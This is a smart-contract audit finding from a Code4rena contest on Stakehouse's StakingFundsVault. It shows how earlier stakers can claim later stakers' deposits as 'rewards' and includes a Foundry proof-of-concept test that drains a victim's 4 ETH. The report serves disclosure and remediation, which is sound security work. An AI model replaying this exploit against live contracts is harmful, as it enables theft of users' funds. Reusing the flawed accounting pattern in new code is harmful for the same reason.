[H-18] Old stakers can steal deposits of new stakers inStakingFundsVault
Submitted byJeiwan, also found byimmeas,rbserver,unforgiven,cccz, and9svR6w
https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L75https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L63
Stakers to the MEV+fees vault can steal funds from the new stakers who staked after a validator was registered and the derivatives were minted. A single staker who staked 4 ETH can steal all funds deposited by new stakers.
Proof of Concept
StakingFundsVaultis designed to pull rewards from a Syndicate contract and distributed them pro-rata among LP token holders (StakingFundsVault.sol#L215-L231):
if(i==0&& !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {// Withdraw any ETH accrued on free floating SLOT from syndicate to this contract// If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched_claimFundsFromSyndicateForDistribution(liquidStakingNetworkManager.syndicate(),_blsPubKeys);// Distribute ETH per LPupdateAccumulatedETHPerLP();}// If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETHLPTokentoken=lpTokenForKnot[_blsPubKeys[i]];require(address(token) !=address(0),"Invalid BLS key");require(token.lastInteractedTimestamp(msg.sender) +30minutes<block.timestamp,"Last transfer too recent");_distributeETHRewardsToUserForToken(msg.sender,address(token),token.balanceOf(msg.sender),_recipient);
TheupdateAccumulatedETHPerLPfunction calculates the reward amount per LP token share (SyndicateRewardsProcessor.sol#L76):
function_updateAccumulatedETHPerLP(uint256_numOfShares)internal{if(_numOfShares>0) {uint256received=totalRewardsReceived();uint256unprocessed=received-totalETHSeen;if(unprocessed>0) {emitETHReceived(unprocessed);// accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down lateraccumulatedETHPerLPShare+= (unprocessed*PRECISION) /_numOfShares;totalETHSeen=received;}}}
And the_distributeETHRewardsToUserForTokenfunction distributes rewards to LP token holders (SyndicateRewardsProcessor.sol#L51):
function_distributeETHRewardsToUserForToken(address_user,address_token,uint256_balance,address_recipient)internal{require(_recipient!=address(0),"Zero address");uint256balance=_balance;if(balance>0) {// Calculate how much ETH rewards the address is owed / dueuint256due= ((accumulatedETHPerLPShare*balance) /PRECISION) -claimed[_user][_token];if(due>0) {claimed[_user][_token] =due;totalClaimed+=due;(boolsuccess, ) =_recipient.call{value:due}("");require(success,"Failed to transfer");emitETHDistributed(_user,_recipient,due);}}}
To ensure that rewards are distributed fairly, these functions are called before LP token balances are updated (e.g. when making a depositStakingFundsVault.sol#L123).
However, this rewards accounting algorithm also counts deposited tokens:
to stake tokens, users calldepositETHForStakingand send ETH (StakingFundsVault.sol#L113);updateAccumulatedETHPerLPis called in the function (StakingFundsVault.sol#L123);updateAccumulatedETHPerLPchecks the balance of the contract, whichalready includes the new staked amount(SyndicateRewardsProcessor.sol#L78,SyndicateRewardsProcessor.sol#L94).the staked amount is then counted in theaccumulatedETHPerLPSharevariable (SyndicateRewardsProcessor.sol#L85), which is used to calculate the reward amount per LP share (SyndicateRewardsProcessor.sol#L61).
This allows the following attack:
a user stakes 4 ETH to a BLS key;the validator with the BLS key gets registered and its derivative tokens get minted;a new user stakes some amount to a different BLS key;the first user callsclaimRewardsand withdraws the stake of the new user.
// test/foundry/StakingFundsVault.t.solfunctiontestStealingOfDepositsByOldStakers_AUDIT()public{// Resetting the mocks, we need real action.MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne,0);MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo,0);liquidStakingManager.setIsPartOfNetwork(blsPubKeyOne,false);liquidStakingManager.setIsPartOfNetwork(blsPubKeyTwo,false);// Aliasing accounts for better readability.addressnodeRunner=accountOne;addressalice=accountTwo;addressalice2=accountFour;addressbob=accountThree;// Node runner registers two BLS keys.registerSingleBLSPubKey(nodeRunner,blsPubKeyOne,accountFive);registerSingleBLSPubKey(nodeRunner,blsPubKeyTwo,accountFive);// Alice deposits to the MEV+fees vault of the first key.maxETHDeposit(alice,getBytesArrayFromBytes(blsPubKeyOne));// Someone else deposits to the savETH vault of the first key.liquidStakingManager.savETHVault().depositETHForStaking{value:24ether}(blsPubKeyOne,24ether);// The first validator is registered and the derivatives are minted.assertEq(vault.totalShares(),0);stakeAndMintDerivativesSingleKey(blsPubKeyOne);assertEq(vault.totalShares(),4ether);// Warping to pass the lastInteractedTimestamp checks.vm.warp(block.timestamp+1hours);// The first key cannot accept new deposits since the maximal amount was deposited// and the validator was register. The vault however can still be used to deposit to// other keys.// Bob deposits to the MEV+fees vault of the second key.maxETHDeposit(bob,getBytesArrayFromBytes(blsPubKeyTwo));assertEq(address(vault).balance,4ether);assertEq(bob.balance,0);// Alice is claiming rewards for the first key.// Notice that no rewards were distributed to the MEV+fees vault of the first key.assertEq(alice2.balance,0);vm.startPrank(alice);vault.claimRewards(alice2,getBytesArrayFromBytes(blsPubKeyOne));vm.stopPrank();LPTokenlpTokenBLSPubKeyOne=vault.lpTokenForKnot(blsPubKeyOne);// Alice has stolen the Bob's deposit.assertEq(alice2.balance,4ether);assertEq(vault.claimed(alice,address(lpTokenBLSPubKeyOne)),4ether);assertEq(vault.claimed(alice2,address(lpTokenBLSPubKeyOne)),0);assertEq(address(vault).balance,0);assertEq(bob.balance,0);}
Recommended Mitigation Steps
Consider excluding newly staked amounts in theaccumulatedETHPerLPSharecalculations.
vince0656 (Stakehouse) confirmed duplicate issue #375